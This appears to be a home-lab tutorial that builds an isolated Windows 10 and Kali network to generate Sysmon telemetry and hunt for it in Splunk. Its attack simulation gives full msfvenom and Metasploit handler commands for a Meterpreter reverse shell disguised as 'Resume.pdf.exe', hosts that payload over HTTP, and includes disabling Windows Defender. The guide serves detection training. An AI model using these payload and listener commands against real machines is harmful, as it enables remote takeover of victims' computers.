🏗️ Quick Overview
Two VMs (Windows 10 + Kali Linux) connected via internal network for controlled malware analysis and SIEM investigation.
Network: 192.168.20.0/24 | Windows: 192.168.20.10 | Kali: 192.168.20.11

🔧 Network Configuration
The Windows machine will utilise the Default NAT setting prior to changing to an internal network to download Splunk enterprise, Sysmon, and download Olaf configuration for Sysmon.

Adapter 1: NAT (internet access)
Adapter 2: Internal Network "intnet"

Set Static IPs on Internal Network:
Windows: 192.168.20.10/24
Kali: 192.168.20.11/24
![image](https://github.com/user-attachments/assets/bfda68a0-3d79-4f02-92ff-57dfb3c2f7be)


🖥️ Windows 10 Setup
1. Install Splunk Enterprise

Download free license version
Install with defaults, access at http://localhost:8000

2. Install Sysmon
powershell# Download Sysmon + Olaf config from GitHub
.\sysmon64.exe -accepteula -i sysmonconfig.xml

4. Configure Splunk Data Input

Head to your Inputs.conf file which will be found in your Splunk>etc>System>local> inputs.conf (If you don't see this file here, copy it over from your 'Default' file)

![image](https://github.com/user-attachments/assets/c63e8e12-651b-49f2-974d-96dbd72daa68)
Input this into your inputs.conf file

5. Create index endpoint
   
After establishing Splunk is installed, with sysmon added with olaf configuration, head to Splunk via localhost:8000 in Microsoft Edge > Settings > Indexes > New Index > In the Index name field enter "endpoint" and hit save.

6. Change Network Adapter Setting

You can now close and create a snapshot as a baseline, and change the network configuration in Virtualbox via settings > Internal network and ensure the name is the same name used for the Kali Linux machine.

7. Set a static IP Address

Change the network adapter settings and disable DHCP and configure the static IP address to the address we listed earlier. (192.168.20.10)

8. Disable Windows Defender

Turn off Real-time Protection (Settings > Update & Security > Windows Security)

9. Enable RDP

Settings > System > Remote Desktop > Enable


🐧 Kali Linux Setup
Network setup:
Edit connection > Wired connection 1 (Click the cog wheel) > IPv4 settings > Add address 192.168.20.11 - Netmask 24 > Add and then click save. 
To test you are in the same internal network, run the terminal in Linux and ping your Windows machine via the syntax - ping 192.168.20.10 

🎯 Attack Simulation
1. Reconnaissance

nmap -A 192.168.20.10 -Pn
Port 3389 (RDP) should be open

2. Create Payload

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe

3. Start Listener

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.20.11
set lport 4444
exploit

4. Host Payload

bash New terminal
python3 -m http.server 9999

5. Execute on Windows🖥️ 

Browse to 192.168.20.11:9999
Download and run Resume.pdf.exe
Verify meterpreter connection

6. 🐧Establish connection to Windows from Linux machine

Run shell in the mepterpreter to establish a connection to the Windows machine.
   ![image](https://github.com/user-attachments/assets/ad2933e0-fc72-4b32-b9c5-f6e321cb6f7c)

7. Run commands to create telemetry for SIEM

On the Linux machine run these three basic recon commands to 
net user
net localgroup
ipconfig

# 🔍 SOC Analysis in Splunk
Initial Detection
splunk
index=endpoint "Resume.pdf.exe"

Process Chain Analysis

splunk Get ProcessGuid from above, then:

index=endpoint <ProcessGuid>
| table _time,ParentImage,Image,CommandLine

Expected: Resume.pdf.exe → cmd.exe → net user/net localgroup/ipconfig

Threat Hunting Query

splunkindex=endpoint EventCode=1 
| where match(Image, "\\.pdf\\.exe$")
| table _time, Computer, Image, CommandLine

![image](https://github.com/user-attachments/assets/60aa3e0b-979c-40d5-8413-01a37a03eb3b)


✅ Validation

Network: Both VMs can ping each other

Splunk: Sysmon events flowing to endpoint index

Attack: Meterpreter session established

Detection: Malware execution visible in Splunk


⚠️ Lab Safety

Isolated network only - no production access

Take VM snapshots before malware execution

Re-enable Windows Defender after testing


Setup time: ~2 hours | Requires: VirtualBox, Windows 10, Kali Linux VMs
